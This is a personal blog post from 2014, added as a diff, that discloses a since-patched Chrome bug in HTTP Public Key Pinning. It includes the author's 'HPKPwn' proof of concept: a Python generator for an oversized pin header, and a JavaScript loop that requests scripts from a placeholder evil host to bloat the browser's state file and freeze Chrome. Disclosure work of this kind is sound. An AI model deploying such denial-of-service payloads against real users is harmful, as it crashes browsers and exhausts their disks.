@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8">
+	<title>cem - hPKPwn</title>
+	<meta name="author" content="Carl Mehner">
+    
+	<link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAiNJREFUOI2Nks9LVFEcxT/3vjfm+KOZTDAnzUmxZtoUoqFhktAPhBbTrj9AJLBFhC1CSqZdCbaIgnYt3ES0DCvNgqhAiEqJJq0JBx1FR+nNOM5T37zbopkhwhk8q8vhnvO953uP6FIDAI3mXPxMYmrJo9K2pAC00iJzb6f3CzAGJHWgfrp//JE5H29FUVCcRXR4cv3ApeZbrhbPbR04tLG4dhSFRGBVBXxDVQHfJ0D7Xzh943WPGTE6lGWXxMbC7a4Wz10d/pkqhF0V8I0DL0ZEMEdnYlK8v/y0GTE6ALCVBIS+kyfn/HVpIcUWSgmhCQtQ+QxElxo4DsSAn1mytrvpQUn9nrld1eVGmb/yLWBttzQFuEN9Lx+Gro0+AY5lTa21zaaFx197k6GYB/gI5P0yoRSao8I5Hx58fxPwAxdn700E9PKihXRy05m9mH8HtpIH+048lQ6Zmhl4c18rK/rdcL29P3znXVD9XWBBgy1nnWtKOuQy8KwxeMoAIkDI6XX/cta5lwoZCCDhvdLaDWxkuOcAqVmjN/l95UhyZtWHrYS7rWYwb4QREVzLnrM9WB6ZaV7/sXoOYAWUu61maEfVLQQdSCNQACglo8OT5yvPNng756/mzM1oAoBUxDicU2oiTaZI34prdk+kZo2T2EqPjYYvx0bD+UcKbOHQ4vsu+F8BmyKTrxboiH9erFaWLYUUajutspXQXcVmaWPFFPABMP8AmgnNwTEAUpoAAAAASUVORK5CYII="> 
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link type="text/css" rel="stylesheet" href="../cem.css" />
+	
+</head>
+
+<body>
+
+<header>
+	<nav>
+		<ul>
+			<li><a href="../index.html"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAiNJREFUOI2Nks9LVFEcxT/3vjfm+KOZTDAnzUmxZtoUoqFhktAPhBbTrj9AJLBFhC1CSqZdCbaIgnYt3ES0DCvNgqhAiEqJJq0JBx1FR+nNOM5T37zbopkhwhk8q8vhnvO953uP6FIDAI3mXPxMYmrJo9K2pAC00iJzb6f3CzAGJHWgfrp//JE5H29FUVCcRXR4cv3ApeZbrhbPbR04tLG4dhSFRGBVBXxDVQHfJ0D7Xzh943WPGTE6lGWXxMbC7a4Wz10d/pkqhF0V8I0DL0ZEMEdnYlK8v/y0GTE6ALCVBIS+kyfn/HVpIcUWSgmhCQtQ+QxElxo4DsSAn1mytrvpQUn9nrld1eVGmb/yLWBttzQFuEN9Lx+Gro0+AY5lTa21zaaFx197k6GYB/gI5P0yoRSao8I5Hx58fxPwAxdn700E9PKihXRy05m9mH8HtpIH+048lQ6Zmhl4c18rK/rdcL29P3znXVD9XWBBgy1nnWtKOuQy8KwxeMoAIkDI6XX/cta5lwoZCCDhvdLaDWxkuOcAqVmjN/l95UhyZtWHrYS7rWYwb4QREVzLnrM9WB6ZaV7/sXoOYAWUu61maEfVLQQdSCNQACglo8OT5yvPNng756/mzM1oAoBUxDicU2oiTaZI34prdk+kZo2T2EqPjYYvx0bD+UcKbOHQ4vsu+F8BmyKTrxboiH9erFaWLYUUajutspXQXcVmaWPFFPABMP8AmgnNwTEAUpoAAAAASUVORK5CYII=" alt="cem.me" />
+            </a></li>
+			<li><a href="../all.html">index</a></li>
+			<li><a href="../about.html">about</a></li>
+			<li><a href="https://plus.google.com/u/0/115606090533118002214?prsrc=3&amp;rel=me" rel="publisher" target="_top" >
+				<img src="https://ssl.gstatic.com/images/icons/gplus-16.png" alt="Google+" class="glogo" />
+			</a></li>
+		</ul>
+	</nav>
+    
+<section id="topTitle">
+  <p>&nbsp;</p><img class=mainLogo src="../logo.png" alt="cem.me"/><br /><h2>carl mehner's blog</h2>
+</section>
+
+
+</header>
+
+
+<!-- -above is template for headers and style- -->
+
+
+
+<article>
+  <header>
+	  <h1 class="title"><a href="papers/hpkpwn">Bug in Chrome security feature can fill up your hard drive &amp; crash the browser</a></h1>
+	  <time class="pubdate" datetime="2014-02-20">2014-02-20</time>
+
+  </header>
+  <p>The security feature in question is one that I have <a href="http://www.cem.me/home/certificatepinning" target="_blank">talked about before</a>: HTTP Public Key Pinning (<a href="https://tools.ietf.org/html/draft-ietf-websec-key-pinning" target="_blank">HPKP</a>). This feature allows a website to tell the browser only to connect to the site if it is using a particular set of SSL certificates. For example, a site can specify that the browser only use a particular CA (certificate authority) or set of CAs when communicating with its servers.</p>
+  <p>This idea of key pinning over http headers is Google's response to the hack of an intermediary CA that issued unauthorized certificates for various domains including many of Google's. Google uses public key pinning on many of its sites, which is how it discovered the DigiNotar hack in the winter of 2011 that issued several Google certificates, the TurkTrust issue on Christmas Eve 2012, and <a href="https://lists.eff.org/pipermail/observatory/2013-December/000721.html" target="_blank">possibly</a> the French CA ANSSI in December of 2013. However, it <a href="http://src.chromium.org/viewvc/chrome/trunk/src/net/http/transport_security_state_static.json" target="_blank">hard codes</a> the pins in the Chrome browser binary, so it does not actually serve up key pins using the HTTP headers. SHODAN at the time I found the bug showed only one site that was <a href="http://www.shodanhq.com/search?q=%22Public-Key-Pins%22" target="_blank">actively using HPKP</a> and it looks like it just served up an error page. Now there are approximately seventeen different sites serving up public key pinning headers, although some of them are not serving up the headers correctly (those are missing the <a href="http://tools.ietf.org/html/draft-ietf-websec-key-pinning-09#section-4.3" target="_blank">required backup pin</a>).</p>
+  <img src="../art/keypin.png" alt="key pin" />
+  <p>On to <a target="_blank" href="https://code.google.com/p/chromium/issues/detail?id=316032">the bug</a>...</p>
+  <p>Without <a target="_blank" href="https://codereview.chromium.org/86043003/">this patch</a> an evil website has the ability to fill up your hard drive, or at least up to about 16 <a target="_blank" href="http://en.wikipedia.org/wiki/Exabyte">exabytes</a> (2^64-1 [map::max_size()] * 300 bytes [or the size of one sha256 public key pinning record]). Granted, this may take a long time as you have to download all of the data directly from a server, but the cloud is "fast and cheap" [<a href="http://xkcd.com/285/" target="_blank">citation needed</a>].</p>
+  <p>The flaw that I found was that Chrome replicates all of the public key pins that are set over http headers (that contain at least one pin valid for the connection) storing them in the state file. The <a href="https://code.google.com/p/chromium/issues/detail?id=320308" target="_blank">public bug report</a> (marked as a duplicate of <a href="https://code.google.com/p/chromium/issues/detail?id=316032" target="_blank">my bug report</a>) discusses that memory usage also grows and links to a simple sample page (now gone) showing best-case pin headers growth over a fast-paced example of 'normal' user behavior on a busy site; especially one heavy on client-side calls, like Facebook or Twitter. Visiting a site with these headers on it would result in a high memory usage and would end up creating a file with a size corresponding to users' usage of the website.</p>
+  <p>In addition, as <a href="http://stalkr.net/" target="_blank">stalkr</a> points out in <a href="https://code.google.com/p/chromium/issues/detail?id=320308#c4" target="_blank">a comment</a> that this can significantly slow down/freeze Chrome. Even one non-malicious website can start to cause Chrome to freeze after a month of mild use.</p>
+  <p>My idea, HPKPwn (a proof of concept exploit for this bug), takes it a bit further and goes for the worst-case approach. You start by standing up a server, setting up a valid HTTPS site, and adding an HPKP header at the maximum allowed size. From what I could see, the maximum parse-able header in Chrome is 256 kilobytes. Therefore, I concluded to concoct a piece of Python that produces the most populous possible parse-able pin-set using a plethora of prefabricated pseudo-hashes.</p>
+
+  <pre><code>
+
+import string
+goodPin = "pin-sha256=\"nAl0ztNX3ojp7pO4SJAeA3EOJz026W/BIE1sBk8eChY=\""
+pins = "Public-Key-Pins: max-age=31536000; " + goodPin;
+x=0
+# keep the length of the pins header just under 254 KB
+while len(pins) < 254900 :
+    # create bogus pins
+    pins += "; pin-sha256=\"" + str(x).rjust(43, '0') + "=\"";
+    x += 1
+print pins
+
+  </code></pre>
+  <p>Loading this header into a webserver and pointing Chrome at it causes the browser to store every hash in the provided header. This is desired behavior on the first communication; however, on any subsequent connection Chrome appends the same header to the end of the pin set for the site and writes the new state to disk. Any new visits to the site must first parse this list of pins to determine if the connection is valid under the rules of certificate pinning. Naturally, I decided that one call for 256KB was not quite enough and that a good way to force the browser to make repeated calls to the server was to use a for-loop that creates calls for JavaScript files from my pin-set-corpulent server.</p> 
+
+  <pre></code>
+&lt;script type="text/javascript"&gt;
+function genJsCalls()
+{
+  // increase Chrome's TransportSecurity file by 1GB
+  for(var i = 0; i &lt; 40;i++)
+  {
+    link = "https://myevilsite.evil/" + i + ".js";
+    document.write("&lt;script src=\"" + link + "\"&gt;&lt;\/script&gt;\r\n");
+  }
+}
+&lt;/script&gt;
+
+&lt;body onload="genJsCalls()"&gt;
+&lt;/body&gt;
+  </code></pre>
+
+  <p>After testing this, I found that it does take a long time to download any substantial amount of data that would possibly cause a space issue on one hard drive. Then, whilst reminiscing about the CRIME vulnerability, I remembered that it took advantage of compressed headers. Compressed headers! For that, we need SPDY, a next-gen server protocol developed by Google. Lucky, the way I constructed the fake headers made them already efficient to compress. The 256KB header in SPDY only takes up about 10 KB on the wire, which means that in only 4096 server responses transferring 40 MB, you can gobble one gigabyte of client disk space.</p>
+  <p>However, rather than just trying to fill up a hard drive, one can simply create a denial of service, you only need a trivial 40-80 responses (equating to 20 MB of data over regular TLS or &asymp;0.75 MB over SPDY) to cause significant hangs and/or freezes within Chrome which will take less than one minute. After a sufficient length of time (based on the amount of memory you have), Windows will throw an unhandled exception error. If using long pin lengths (e.g. 1 year, as above) the only remedy is to find and delete the transport security configuration file. This is due to the fact, as security savant Adam Langley <a href="https://code.google.com/p/chromium/issues/detail?id=320308#c6" target="_blank">has</a> <a href="https://code.google.com/p/chromium/issues/detail?id=316032#c12" target="_blank">confirmed</a> the patch does not re-parse the transport security file to remove existing duplicates.</p>
+  <p>Google <a href="https://src.chromium.org/viewvc/chrome/trunk/src/net/http/http_security_headers.cc?r1=209290&r2=237168&pathrev=237168" target="_blank">has fixed this issue</a> in Chrome 33 which was released on the main <a href="http://googlechromereleases.blogspot.com/2014/02/stable-channel-update_20.html" target="_blank">Stable Channel</a> and <a href="http://googlechromereleases.blogspot.com/2014/02/chrome-beta-for-android-update_20.html" targe"_blank">Android</a> on 2014-02-20, the fix reached the <a href="http://googlechromereleases.blogspot.com/2014/02/chrome-for-ios-update_18.html" target="_blank">iOS</a> stable codebase first, on 2014-02-18.</p>
+  <p>Now that Google has fixed this issue, find at least two certificates (one to pin and one as a backup), head over to <a href="https://certpins.appspot.com/" target="_blank">https://certpins.appspot.com</a>, and create your HPKP-pins to add to your site headers!</p>
+  <p>That <a href="https://certpins.appspot.com/" target="_blank">website</a>, is an open source webapp that I created to assist in the creation of public key pins from existing SSL certificates.</p>
+
+
+</article>
+
+
+
+<footer>
+	<cite>Copyright &copy; Carl Mehner</cite>
+</footer>
+
+</body>
+</html>
+
